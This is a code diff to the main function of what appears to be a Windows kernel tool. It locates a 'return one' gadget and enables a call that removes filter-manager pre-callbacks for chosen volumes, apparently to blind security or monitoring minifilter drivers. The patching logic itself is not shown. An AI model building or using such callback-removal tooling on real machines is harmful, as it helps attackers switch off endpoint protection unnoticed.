@@ -16,6 +16,13 @@ int main(int argc, char** argv) {
 
 	Memory m = Memory();
 	FltManager oFlt = FltManager(&m);
+	LPVOID lpReturnOneGadget = oFlt.FindRet1();
+	printf("Found return one gadget at %llx\n", lpReturnOneGadget);
+	getchar();
+	if (!lpReturnOneGadget) {
+		exit(-1);
+	}
+
 	DWORD dwX = oFlt.GetFrameCount();
 	printf("Flt globals is at %p\n", oFlt.lpFltGlobals);
 	printf("%d frames available\n", dwX);
@@ -47,7 +54,7 @@ int main(int argc, char** argv) {
 		printf("Retained target volume : %S - %p\n", x.first, x.second);
 	}*/
 	
-	//BOOL bRes = oFlt.RemovePreCallbacksForVolumesAndCallbacks(vecOperations, frameVolumes);
+	BOOL bRes = oFlt.RemovePreCallbacksForVolumesAndCallbacks(vecOperations, frameVolumes, lpReturnOneGadget);
 
 	return 0;
 }
